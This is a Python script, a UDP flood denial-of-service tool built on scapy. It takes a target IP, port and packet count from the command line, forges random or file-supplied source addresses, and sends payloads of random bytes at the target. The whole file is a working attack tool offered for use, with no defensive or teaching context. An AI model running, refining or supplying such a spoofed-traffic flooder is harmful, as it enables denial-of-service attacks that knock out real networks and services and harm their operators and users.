#!/usr/bin/python3
from os import system
from sys import stdout
from scapy import *
from scapy.all import *
from random import randint

import argparse

def randomIP():
    rand_ip = ".".join(map(str, (randint(0,255)for _ in range(4))))
    return rand_ip

def randomPort():
    rand_port = randint(1000,65535)
    return rand_port

def read_ip(file):
    ip_lists = []
    try:
        with open(file, 'r') as f:
            for line in f:
                ip = line.strip()
                ip_lists.append(ip)
        return ip_lists

    except FileNotFoundError:
        print(f"File {file} not found.")
        sys.exit(1) #End process

'''def create_ip_port_array(count):
    ip_port_list = []
    for _ in range(0, count):
        ip = randomIP()
        port = randint(1000,65535)
        ip_port_list.append([ip, port])
    return ip_port_list
'''

def udp_flood_attack(dst_ip, dst_port, counter, ip_src_file):
    if ip_src_file is None:
        ip_src_list = [randomIP() for _ in range(0,counter)]
    else: 
        ip_src_list = read_ip(ip_src_file)
    port_src_list = [randomPort() for _ in range(0,counter)]
    
    #lists = create_ip_port_array(counter)
    if dst_port == 0:
        port_dst_list = [randint(1000,65535) for _ in range(0,counter)]
    else:
        port_dst_list = [dst_port for _ in range(0,counter)]

    print("Packets are sending ... ")
    for i in range(0,counter):
        ip_src = random.choice(ip_src_list)
        
        packet = IP(src=ip_src, dst=dst_ip) / UDP(sport=port_src_list[i], dport=port_dst_list[i]) / Raw(load=random._urandom(256))
        send(packet, verbose=False)

        print(f"src is {ip_src}:{port_src_list[i]}, dst is {dst_ip}:{port_dst_list[i]}")
        
    print(f"Total packets sent: {counter}")
    

def main():
    parser = argparse.ArgumentParser(description = "UDP Flood")
    parser.add_argument('-ti', '--target_ip', help='Specify the target IP or Domain. e.g. 127.0.0.1', required=True)
    parser.add_argument('-tp', '--target_port', help="Specify the target port by input {port}, or don't use.", required=False)
    parser.add_argument('-c', '--count', help="Specify the number of packets that you want to send", required=True)
    parser.add_argument('-si', '--source_ip', help="Specify source ip by input {file_name}, e.g. src_ip.txt", required=False)

    arg = parser.parse_args()

    if (arg.target_port is None):
        udp_flood_attack(arg.target_ip, 0, int(arg.count), arg.source_ip)
    else:
        udp_flood_attack(arg.target_ip, int(arg.target_port), int(arg.count), arg.source_ip)

if __name__ == '__main__':
    main()
